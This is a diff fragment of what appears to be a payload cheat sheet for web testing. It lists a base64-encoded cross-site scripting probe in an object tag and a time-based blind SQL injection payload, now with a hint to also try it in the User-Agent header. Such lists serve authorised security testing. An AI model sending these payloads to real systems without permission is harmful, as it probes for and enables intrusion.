@@ -52,4 +52,4 @@ SQL injection in search
 
 <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoNCk+></object>
 
-XOR(if(now()=sysdate(),sleep(5),0))XOR
+XOR(if(now()=sysdate(),sleep(5),0))XOR --> also try in user-agent
